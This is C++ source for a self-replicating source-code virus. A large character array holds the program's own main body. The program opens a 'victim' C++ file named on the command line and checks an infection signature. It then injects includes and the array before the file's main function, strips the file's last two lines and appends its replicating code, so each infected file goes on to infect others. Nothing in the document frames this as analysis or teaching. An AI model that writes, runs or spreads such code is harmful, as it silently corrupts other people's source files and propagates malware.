#include <iostream>
#include <fstream>
#include <vector>
#include <algorithm>
using namespace std;

char s[]={
		'\t',
		'i',
		'f',
		' ',
		'(',
		'a',
		'r',
		'g',
		'v',
		'[',
		'1',
		']',
		')',
		'\n',
		'\t',
		'{',
		'\n',
		'\t',
		'\t',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		'v',
		'i',
		'c',
		't',
		'i',
		'm',
		'=',
		'a',
		'r',
		'g',
		'v',
		'[',
		'1',
		']',
		';',
		'\n',
		'\t',
		'\t',
		'f',
		's',
		't',
		'r',
		'e',
		'a',
		'm',
		' ',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		';',
		'\n',
		'\t',
		'\t',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		'.',
		'o',
		'p',
		'e',
		'n',
		'(',
		'v',
		'i',
		'c',
		't',
		'i',
		'm',
		')',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'/',
		'/',
		'p',
		'u',
		't',
		' ',
		'a',
		'l',
		'l',
		' ',
		'c',
		'o',
		'n',
		't',
		'e',
		'n',
		't',
		' ',
		'i',
		'n',
		't',
		'o',
		' ',
		'a',
		' ',
		'v',
		'e',
		'c',
		't',
		'o',
		'r',
		' ',
		'o',
		'f',
		' ',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		's',
		'\n',
		'\t',
		'\t',
		'v',
		'e',
		'c',
		't',
		'o',
		'r',
		' ',
		'<',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		'>',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		';',
		'\n',
		'\t',
		'\t',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		'l',
		'i',
		'n',
		'e',
		';',
		'\n',
		'\t',
		'\t',
		'w',
		'h',
		'i',
		'l',
		'e',
		'(',
		'g',
		'e',
		't',
		'l',
		'i',
		'n',
		'e',
		'(',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		',',
		'l',
		'i',
		'n',
		'e',
		')',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'p',
		'u',
		's',
		'h',
		'_',
		'b',
		'a',
		'c',
		'k',
		'(',
		'l',
		'i',
		'n',
		'e',
		')',
		';',
		'\n',
		'\t',
		'\t',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		'.',
		'c',
		'l',
		'o',
		's',
		'e',
		'(',
		')',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'/',
		'/',
		'a',
		'v',
		'o',
		'i',
		'd',
		' ',
		'v',
		'a',
		'r',
		'i',
		'a',
		'b',
		'l',
		'e',
		' ',
		'r',
		'e',
		'-',
		'd',
		'e',
		'c',
		'l',
		'a',
		'r',
		'a',
		't',
		'i',
		'o',
		'n',
		'\n',
		'\t',
		'\t',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		's',
		'i',
		'g',
		'n',
		'a',
		't',
		'u',
		'r',
		'e',
		'=',
		'"',
		'\\',
		't',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		'v',
		'i',
		'c',
		't',
		'i',
		'm',
		'=',
		'a',
		'r',
		'g',
		'v',
		'[',
		'1',
		']',
		';',
		'"',
		';',
		'\n',
		'\t',
		'\t',
		'i',
		'f',
		'(',
		'f',
		'i',
		'n',
		'd',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		',',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'e',
		'n',
		'd',
		'(',
		')',
		',',
		' ',
		's',
		'i',
		'g',
		'n',
		'a',
		't',
		'u',
		'r',
		'e',
		')',
		' ',
		'=',
		'=',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'e',
		'n',
		'd',
		'(',
		')',
		')',
		'\n',
		'\t',
		'\t',
		'{',
		'\n',
		'\t',
		'\t',
		'\t',
		'/',
		'/',
		'f',
		'i',
		'n',
		'd',
		' ',
		'm',
		'a',
		'i',
		'n',
		'\n',
		'\t',
		'\t',
		'\t',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		'm',
		'a',
		'i',
		'n',
		'_',
		's',
		'i',
		'g',
		'n',
		'a',
		't',
		'u',
		'r',
		'e',
		'=',
		'"',
		'i',
		'n',
		't',
		' ',
		'm',
		'a',
		'i',
		'n',
		'(',
		'i',
		'n',
		't',
		' ',
		'a',
		'r',
		'g',
		'c',
		',',
		' ',
		'c',
		'h',
		'a',
		'r',
		'*',
		'*',
		' ',
		'a',
		'r',
		'g',
		'v',
		')',
		' ',
		'{',
		'"',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		'l',
		'i',
		'n',
		'e',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'p',
		't',
		'r',
		'd',
		'i',
		'f',
		'f',
		'_',
		't',
		' ',
		'p',
		'o',
		's',
		' ',
		'=',
		' ',
		'f',
		'i',
		'n',
		'd',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		',',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'e',
		'n',
		'd',
		'(',
		')',
		',',
		' ',
		'm',
		'a',
		'i',
		'n',
		'_',
		's',
		'i',
		'g',
		'n',
		'a',
		't',
		'u',
		'r',
		'e',
		')',
		' ',
		'-',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'\t',
		'i',
		'f',
		' ',
		'(',
		'p',
		'o',
		's',
		' ',
		'<',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		's',
		'i',
		'z',
		'e',
		'(',
		')',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'{',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'p',
		'o',
		's',
		' ',
		'=',
		' ',
		'p',
		'o',
		's',
		'-',
		'1',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'#',
		'i',
		'n',
		'c',
		'l',
		'u',
		'd',
		'e',
		' ',
		'<',
		'i',
		'o',
		's',
		't',
		'r',
		'e',
		'a',
		'm',
		'>',
		'\\',
		'n',
		'#',
		'i',
		'n',
		'c',
		'l',
		'u',
		'd',
		'e',
		' ',
		'<',
		'f',
		's',
		't',
		'r',
		'e',
		'a',
		'm',
		'>',
		'\\',
		'n',
		'#',
		'i',
		'n',
		'c',
		'l',
		'u',
		'd',
		'e',
		' ',
		'<',
		'v',
		'e',
		'c',
		't',
		'o',
		'r',
		'>',
		'\\',
		'n',
		'#',
		'i',
		'n',
		'c',
		'l',
		'u',
		'd',
		'e',
		' ',
		'<',
		'a',
		'l',
		'g',
		'o',
		'r',
		'i',
		't',
		'h',
		'm',
		'>',
		'\\',
		'n',
		'u',
		's',
		'i',
		'n',
		'g',
		' ',
		'n',
		'a',
		'm',
		'e',
		's',
		'p',
		'a',
		'c',
		'e',
		' ',
		's',
		't',
		'd',
		';',
		'"',
		')',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'p',
		't',
		'r',
		'd',
		'i',
		'f',
		'f',
		'_',
		't',
		' ',
		'p',
		'o',
		's',
		' ',
		'=',
		' ',
		'f',
		'i',
		'n',
		'd',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		',',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'e',
		'n',
		'd',
		'(',
		')',
		',',
		' ',
		'm',
		'a',
		'i',
		'n',
		'_',
		's',
		'i',
		'g',
		'n',
		'a',
		't',
		'u',
		'r',
		'e',
		')',
		' ',
		'-',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'c',
		'h',
		'a',
		'r',
		' ',
		's',
		'[',
		']',
		'=',
		'{',
		'"',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'p',
		'o',
		's',
		'=',
		'p',
		'o',
		's',
		'+',
		'1',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'i',
		'n',
		't',
		' ',
		'i',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'f',
		'o',
		'r',
		'(',
		'i',
		'=',
		'0',
		';',
		's',
		'[',
		'i',
		']',
		';',
		'i',
		'+',
		'+',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'{',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'i',
		'f',
		' ',
		'(',
		's',
		'[',
		'i',
		']',
		'=',
		'=',
		'\'',
		'\\',
		'n',
		'\'',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'\\',
		't',
		'\\',
		't',
		'\'',
		'\\',
		'\\',
		'n',
		'\'',
		',',
		'"',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'e',
		'l',
		's',
		'e',
		' ',
		'i',
		'f',
		' ',
		'(',
		's',
		'[',
		'i',
		']',
		'=',
		'=',
		'\'',
		'\\',
		'\\',
		'\'',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'\\',
		't',
		'\\',
		't',
		'\'',
		'\\',
		'\\',
		'\\',
		'\\',
		'\'',
		',',
		'"',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'e',
		'l',
		's',
		'e',
		' ',
		'i',
		'f',
		' ',
		'(',
		's',
		'[',
		'i',
		']',
		'=',
		'=',
		'\'',
		'\\',
		'\'',
		'\'',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'\\',
		't',
		'\\',
		't',
		'\'',
		'\\',
		'\\',
		'\'',
		'\'',
		',',
		'"',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'e',
		'l',
		's',
		'e',
		' ',
		'i',
		'f',
		' ',
		'(',
		's',
		'[',
		'i',
		']',
		'=',
		'=',
		'\'',
		'\\',
		't',
		'\'',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'\\',
		't',
		'\\',
		't',
		'\'',
		'\\',
		'\\',
		't',
		'\'',
		',',
		'"',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'e',
		'l',
		's',
		'e',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'{',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		's',
		't',
		'r',
		'i',
		'n',
		'g',
		' ',
		'i',
		't',
		'e',
		'm',
		' ',
		'=',
		' ',
		'"',
		'\\',
		't',
		'\\',
		't',
		'\'',
		'"',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'i',
		't',
		'e',
		'm',
		' ',
		'+',
		'=',
		's',
		'[',
		'i',
		']',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'i',
		't',
		'e',
		'm',
		' ',
		'+',
		'=',
		'"',
		'\'',
		',',
		'"',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'i',
		't',
		'e',
		'm',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'}',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'\t',
		'p',
		'o',
		's',
		' ',
		'=',
		' ',
		'p',
		'o',
		's',
		'+',
		'1',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'}',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'i',
		'n',
		's',
		'e',
		'r',
		't',
		'(',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'b',
		'e',
		'g',
		'i',
		'n',
		'(',
		')',
		'+',
		'p',
		'o',
		's',
		',',
		' ',
		'"',
		'}',
		';',
		'"',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'}',
		'\n',
		'\n',
		'\t',
		'\t',
		'\t',
		'/',
		'/',
		't',
		'r',
		'u',
		'n',
		'c',
		'a',
		't',
		'e',
		' ',
		'r',
		'e',
		't',
		'u',
		'r',
		'n',
		' ',
		'0',
		'\n',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'p',
		'o',
		'p',
		'_',
		'b',
		'a',
		'c',
		'k',
		'(',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		'p',
		'o',
		'p',
		'_',
		'b',
		'a',
		'c',
		'k',
		'(',
		')',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'\t',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		'.',
		'o',
		'p',
		'e',
		'n',
		'(',
		'v',
		'i',
		'c',
		't',
		'i',
		'm',
		',',
		'o',
		'f',
		's',
		't',
		'r',
		'e',
		'a',
		'm',
		':',
		':',
		'o',
		'u',
		't',
		'|',
		'o',
		'f',
		's',
		't',
		'r',
		'e',
		'a',
		'm',
		':',
		':',
		't',
		'r',
		'u',
		'n',
		'c',
		')',
		';',
		'\n',
		'\t',
		'\t',
		'\t',
		'/',
		'/',
		'w',
		'r',
		'i',
		't',
		'e',
		' ',
		't',
		'h',
		'e',
		' ',
		'v',
		'e',
		'c',
		't',
		'o',
		'r',
		' ',
		'b',
		'a',
		'c',
		'k',
		' ',
		't',
		'o',
		' ',
		'f',
		'i',
		'l',
		'e',
		'\n',
		'\t',
		'\t',
		'\t',
		'f',
		'o',
		'r',
		'(',
		'i',
		'n',
		't',
		' ',
		'i',
		'=',
		'0',
		';',
		' ',
		'i',
		'<',
		'l',
		'i',
		'n',
		'e',
		's',
		'.',
		's',
		'i',
		'z',
		'e',
		'(',
		')',
		';',
		' ',
		'i',
		'+',
		'+',
		')',
		'\n',
		'\t',
		'\t',
		'\t',
		'\t',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		' ',
		'<',
		'<',
		' ',
		'l',
		'i',
		'n',
		'e',
		's',
		'[',
		'i',
		']',
		'<',
		'<',
		'e',
		'n',
		'd',
		'l',
		';',
		'\n',
		'\n',
		'\t',
		'\t',
		'\t',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		'<',
		'<',
		's',
		';',
		'\n',
		'\t',
		'\t',
		'}',
		'\n',
		'\t',
		'\t',
		't',
		'a',
		'r',
		'g',
		'e',
		't',
		'_',
		'f',
		'i',
		'l',
		'e',
		'.',
		'c',
		'l',
		'o',
		's',
		'e',
		'(',
		')',
		';',
		'\n',
		'\t',
		'}',
		'\n',
		'\t',
		'r',
		'e',
		't',
		'u',
		'r',
		'n',
		' ',
		'0',
		';',
		'\n',
		'}',
		'\n',
};
int main(int argc, char** argv) {
	if (argv[1])
	{
		string victim=argv[1];
		fstream target_file;
		target_file.open(victim);

		//put all content into a vector of strings
		vector <string> lines;
		string line;
		while(getline(target_file,line))
			lines.push_back(line);
		target_file.close();

		//avoid variable re-declaration
		string signature="\tstring victim=argv[1];";
		if(find(lines.begin(), lines.end(), signature) == lines.end())
		{
			//find main
			string main_signature="int main(int argc, char** argv) {";
			string line;
			ptrdiff_t pos = find(lines.begin(), lines.end(), main_signature) - lines.begin();

			if (pos < lines.size())
			{
				pos = pos-1;
				lines.insert(lines.begin()+pos, "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\nusing namespace std;");

				ptrdiff_t pos = find(lines.begin(), lines.end(), main_signature) - lines.begin();
				lines.insert(lines.begin()+pos, "char s[]={");
				pos=pos+1;
				int i;
				for(i=0;s[i];i++)
				{
					if (s[i]=='\n')
						lines.insert(lines.begin()+pos, "\t\t'\\n',");
					else if (s[i]=='\\')
						lines.insert(lines.begin()+pos, "\t\t'\\\\',");
					else if (s[i]=='\'')
						lines.insert(lines.begin()+pos, "\t\t'\\'',");
					else if (s[i]=='\t')
						lines.insert(lines.begin()+pos, "\t\t'\\t',");
					else
					{
						string item = "\t\t'";
						item +=s[i];
						item +="',";
						lines.insert(lines.begin()+pos, item);
					}
					pos = pos+1;

				}
				lines.insert(lines.begin()+pos, "};");
			}

			//truncate return 0
			lines.pop_back();
			lines.pop_back();

			target_file.open(victim,ofstream::out|ofstream::trunc);
			//write the vector back to file
			for(int i=0; i<lines.size(); i++)
				target_file << lines[i]<<endl;

			target_file<<s;
		}
		target_file.close();
	}
	return 0;
}
